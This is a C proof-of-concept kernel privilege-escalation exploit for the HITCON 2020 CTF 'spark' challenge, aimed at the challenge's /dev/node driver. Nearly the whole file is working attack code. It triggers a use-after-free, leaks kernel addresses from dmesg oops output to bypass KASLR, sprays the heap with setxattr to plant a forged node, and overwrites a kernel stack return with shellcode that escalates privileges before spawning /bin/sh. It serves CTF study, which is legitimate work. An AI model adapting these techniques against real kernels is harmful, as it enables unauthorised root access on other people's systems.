/* This PoC is completely based on @c0m0r1 's one. (https://github.com/c0m0r1/CTF-Writeup/blob/master/hitcon2020/spark/exploit.c) */
/* Also, some of the code is quoted from demo.c distributed during the CTF by author @david942j. */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>

// commands
#define SPARK_LINK 0x4008D900
#define SPARK_FINALIZE 0xD902
#define SPARK_QUERY 0xC010D903
#define SPARK_GET_INFO 0x8018D901
#define DEV_PATH "/dev/node"

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define N 0x20

// globals
static int fd[N];
struct pt_regs lk_regs;   // leaked regs
struct node_struct fake_node0;

const spark_graph_query_stack_offset = 0xFEB0;
/*
(gdb) p $rsp
$3 = (void *) 0xffffc900001dfea0
(gdb) set $spark_graph_query=$3
(gdb) set $leaked_sp=0xffffc900001efd50
(gdb) p/x (long)$leaked_sp - (long)$spark_graph_query
$5 = 0xfeb0
*/

#define WAIT getc(stdin);
#define ulong unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}

struct spark_ioctl_query {
  int fd1;
  int fd2;
  long long distance;
};

struct edge;
struct node_info;
struct node_struct;

struct edge{
  struct edge *next_edge;
  struct edge *prev_edge;
  struct node_struct *node_to;
  ulong weight;
};

struct node_info{
  ulong cur_edge_idx;
  ulong capacity;
  struct node_struct **nodes;
};

struct node_struct{
  ulong index;
  long refcnt;
  char mutex_state[0x20];
  ulong is_finalized;
  char mutex_nb[0x20];
  ulong num_edge;
  struct edge *prev_edge;
  struct edge *next_edge;
  ulong finalized_idx;
  struct node_info *info;
};

static void _link(int fd0, int fd1, unsigned int weight) {
  assert(fd0 < fd1);
  //printf("[+] Creating link between %d and %d with weight %u\n", fd0-3, fd1-3, weight);
  assert(ioctl(fd0, SPARK_LINK, fd1 | ((unsigned long long) weight << 32)) == 0);
}

static void _query(int fd0, int fd1, int fd2) {
  struct spark_ioctl_query qry = {
    .fd1 = fd1,
    .fd2 = fd2,
  };
  assert(ioctl(fd0, SPARK_QUERY, &qry) == 0);
}

static void _finalize(int fd0) {
  int r = ioctl(fd0, SPARK_FINALIZE);
}

void invoke_gpf()
{
  printf("[+] invoking #GPF...\n");
  for (int i = 0; i < 3; i++) {
    fd[i] = open(DEV_PATH, O_RDONLY);
    assert(fd[i] >= 0);
  }
  _link(fd[0], fd[1], 1); // still, their refcnt==1
  close(fd[0]);   // node0's refcnt==0, then be kfree(), making floating-pointer
  assert(ioctl(fd[1], SPARK_FINALIZE) == 0);  // dereference invalid pointer in node0 and invoke oops, then child be killed.
}

void leak_kaslr()
{
  char buf[0x200];
  char dum[0x200];
  const char *format ="\
[    %f] RSP: 0018:%lx EFLAGS: %lx\n\
[    %f] RAX: %lx RBX: %lx RCX: %lx\n\
[    %f] RDX: %lx RSI: %lx RDI: %lx\n\
[    %f] RBP: %lx R08: %lx R09: %lx\n\
[    %f] R10: %lx R11: %lx R12: %lx\n\
[    %f] R13: %lx R14: %lx R15: %lx";
  float fs[0x10];
  printf("[+] leaking KASLR via dmesg...\n");
  system("dmesg | grep -A13 \"general protection\" | grep -A20 RSP > /tmp/dmesg_leak");
  FILE *fp = fopen("/tmp/dmesg_leak", "r");
  fscanf(fp, format, \
  fs, &lk_regs.sp, &lk_regs.flags,  fs, &lk_regs.ax, &lk_regs.bx, &lk_regs.cx, \
  fs, &lk_regs.dx, &lk_regs.si, &lk_regs.di,  fs, &lk_regs.bp, &lk_regs.r8, &lk_regs.r9, \
  fs, &lk_regs.r10, &lk_regs.r11, &lk_regs.r12,  fs, &lk_regs.r13, &lk_regs.r14, &lk_regs.r15);
  fclose(fp);
  print_regs(&lk_regs);
}

void forge_fake_node(struct node_struct *fake_node, ulong finalized_idx){
  fake_node->index = 0xdeadbeef;
  fake_node->refcnt = 0xdeadbeef;
  fake_node->is_finalized = 1;    // prevent deeper traversal.
  fake_node->num_edge = 0;
  fake_node->prev_edge = NULL;
  fake_node->next_edge = NULL;
  fake_node->finalized_idx = finalized_idx;
  fake_node->info = NULL;
  memset(&fake_node->mutex_nb, '\x00', 0x20);
  memset(&fake_node->mutex_state, '\x00', 0x20);
}

#define ALLOC_KMALLOC_128(NUM) for(int i=0; i<NUM; ++i) open(DEV_PATH, O_RDWR);

int main(int argc, char *argv[]) {
  if(argc == 2){
    // invoke #GPF and Oops in the child and leak KASLR via dmesg
    // FYI: dmesg is restricted to adm group on the latest Ubuntu by default.
    // cf: https://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-20.10-Restrict-dmesg
    invoke_gpf();
    exit(0);    // unreachable
  }else{
    const char *cmd = malloc(0x100);
    sprintf(cmd, "%s gpf", argv[0]);
    system(cmd); // cause #GPF
    leak_kaslr();
  }

  for(int i = 0; i < N; i++) {
    fd[i] = open(DEV_PATH, O_RDWR);
    assert(fd[i]);
  }

  // distance array became the size of 0x80
  _link(fd[1], fd[3], 0x1);       // fd[2] is used to retrieve the very heap leaked by R11
  for(int ix=3; ix<0x11; ++ix){
    _link(fd[ix], fd[ix+1], 0x1);
  }
  _link(fd[0], fd[1], (ulong)shellcode + 8);     // this link should be at the very last
  close(fd[0]);   // vuln

  // forge fake node
  ulong write_target = lk_regs.sp - spark_graph_query_stack_offset;
  forge_fake_node(&fake_node0,(write_target - lk_regs.r11) / sizeof(ulong));
  ALLOC_KMALLOC_128(0x12);

  // retrieve fd[0]'s node(private_data)
  setxattr("/home/spark", "NIRUGIRI", &fake_node0, sizeof(fake_node0), XATTR_CREATE);
  close(fd[2]);       // retrieve the very heap leaked by R11 when #GPF.
  _finalize(fd[1]);
  // now, node1.info->nodes are... node1 -> node3 -> node4 -> node5 -> ... -> node0x11 (0x10)

  _query(fd[1], fd[1], fd[9]);
  // distance array (8*0x10) is kmalloced.
  // first, node1 is checked and distance[0] = -1.
  // then,  node0 is checked and distance[target] = shellcode.

  NIRUGIRI();
  return 0;
}
